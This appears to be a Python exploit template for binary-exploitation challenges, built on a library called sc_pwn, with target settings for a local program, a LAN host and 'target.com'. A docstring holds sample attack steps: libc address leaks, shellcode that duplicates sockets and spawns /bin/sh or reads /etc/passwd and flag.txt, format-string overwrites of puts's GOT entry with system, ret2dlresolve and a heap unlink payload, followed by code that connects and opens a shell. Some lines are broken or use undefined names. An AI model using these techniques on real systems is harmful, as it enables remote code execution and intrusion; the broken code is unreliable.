#!/usr/bin/env python
from sc_pwn import *

"""
target     = {'host':'192.168.75.139','port':8080}
target     = {'program':'./pwn'}
target     = {'host':'192.168.75.139','port':22,'username':'vuln','password':'guest','program':'./pwn'}
"""

str_pname   = './pwn'
env = Environment('local', 's_local', 's_remote')
env.set_item('mode',    local = 'LOCAL', s_local = 'SOCKET', s_remote = 'SOCKET')
env.set_item('target',  local       = {'program':str_pname}, \
                        s_local     = {'host':'192.168.75.139','port':8080}, \
                        s_remote    = {'host':'target.com','port':4296})
env.set_item('libc',    local       = lib_path(str_pname, 'libc.so.6'), \
                        s_local     = 'D:\CTF\FILES\libc-2.19.so_x86_local', \
                        s_remote    = 'libc-2.19.so_remote')
env.select('s_local')
#env.select()

binf = ELF(str_pname, rop=True)

addr_plt_puts       = binf.plt('puts')
addr_got_main       = binf.got('__libc_start_main')
addr_bss            = binf.section('.bss')
addr_main           = binf.function('main')

addr_pop2           = binf.ropgadget('pop','pop','ret')
addr_leave          = binf.ropgadget('leave','ret')

#==========
def attack(cmn):
    """ 
    cmn.set_show('RAW')
    cmn.set_show('HEXDUMP')
    
    cmn.read_until('\n')
    addr_libc_main      = unpack_32(cmn.read(4))
    addr_libc_puts      = unpack_32(cmn.read(4))
    cmn.read_all()
    
    info("information   = 0x%08x"%0xdeadbeef)
    proc("processed     = 0x%08x"%0xcafebabe)
    warn("waring        = 0x%08x"%0)
    fail("failure       = 0x%08x"%0)

    #==========

    libcdb = libcDB(__libc_start_main=addr_libc_main, puts=addr_libc_puts)
    addr_libc_base      = addr_libc_main - libcdb.symbol('__libc_start_main')
    addr_libc_system    = addr_libc_base + libcdb.symbol('system')
    addr_libc_str_sh    = addr_libc_base + libcdb.string('/bin/sh')

    libcdb.download(env.libc)
    libc = ELF(env.libc)
    libc.set_location('__libc_start_main', addr_libc_main)
    addr_libc_system    = libc.function('system')
    addr_libc_str_sh    = libc.search('/bin/sh')
    
    if env.check('local'):
        info('local')
    elif env.check('remote'):
        info('remote')
    else
        fail('error')

    #==========
    
    sc = ShellCode('x86',260)
    sc.dup2(4,0)
    sc.dup2(4,1)
    sc.gen('\x90')
    sc.sh()
    sc.padding()
    cmn.send(sc.get())

    sc = ShellCode('x86',max_len=260)
    shellcode  = sc.dup2(4,0)
    shellcode += sc.dup2(4,1)
    shellcode += sc.open('flag.txt')
    shellcode += sc.rval2arg(1)
    shellcode += sc.read(None,addr_bss,0x500)
    shellcode += sc.rval2arg(3)
    shellcode += sc.write(STDOUT_FILENO,addr_bss,None)
    shellcode += sc.read_file('/etc/passwd')
    shellcode += sc.execve(addr_str_sh)
    shellcode += sc.padding(None,'\x90')
    cmn.send(shellcode)

    sc = ShellCode('arm',null_free=True)
    shellcode_st2  = sc.open('/etc/passwd')
    shellcode_st2 += sc.rval2arg(1)
    shellcode_st2 += sc.read(None,addr_bss,0x501)
    shellcode_st2 += sc.open('test.txt', O_CREAT | O_WRONLY)
    shellcode_st2 += sc.rval2arg(1)
    shellcode_st2 += sc.write(None,addr_bss,0x501)    
    shellcode_st2 += sc.execve('/bin/cat',['test.txt'])
    shellcode_st1  = sc.start()
    shellcode_st1 += sc.stager(size=len(shellcode_st2))
    nc.send(shellcode_st1)
    nc.send(shellcode_st2)

    #==========
    
    fsb = FSB(header=len(shellcode),gap=2,size=2)
    fsb.set_adrval(addr_got_puts, addr_libc_system)
    fsb.set_adrval(addr_heap, 0xdeadbeef)
    fsb.auto_write(index=6)
    exploit  = shellcode
    exploit += fsb.get()
    cmn.sendln(exploit)

    fsb_leak = '%08x %08x'
    fsb = FSB(header=len(shellcode)+len(fsb_leak),count=len(shellcode)+17,size=2)
    exploit  = shellcode+fsb_leak
    exploit += fsb.addr(addr_got_puts)
    exploit += fsb.addr(addr_got_puts+0x02)
    exploit += fsb.write(6,addr_libc_system&0xffff)
    exploit += fsb.write(7,addr_libc_system>>0x10)
    cmn.sendln(exploit)

    #==========
    
    dl = DLresolve('x86',addr_dynsym, addr_dynstr, addr_relplt, addr_version)
    dl.set_funcadr(addr_got_fgets,'gets')
    dl.set_funcadr(addr_got_puts,'system')
    dlr = dl.resolve(addr_buf)
    cmn.sendln(dlr)

    exploit  = pack_32(addr_plt_reloc)
    exploit += pack_32(dl.offset('system'))
    exploit += pack_32(addr_plt_exit)
    exploit += pack_32(addr_buf)

    #==========
    
    exploit  = pack_32(heap_sb(0xc,PREV_INUSE|IS_MMAPED|IS_NON_MAINARENA))  # p->size
    exploit += pack_32(addr_got_puts-0x8)                                   # p->fd
    exploit += pack_32(addr_heap)                                           # p->bk
    cmn.sendln(exploit)

    cmn.read_all()
    """

#==========

if __name__=='__main__':
    cmn = Communicate(env.target, env.mode)
    #cmn = Communicate(target, mode='SOCKET')
    #cmn = Communicate(target, mode='LOCAL', ASLR=False, lib='./mylib.so', wait=True)
    #cmn = Communicate(target, mode='SSH', ASLR=False)
    attack(cmn)

    sh = Shell(cmn)
    sh.select()
    del(sh)
    #Interact(cmn).worker(False)
    
    del(cmn)
    
#==========
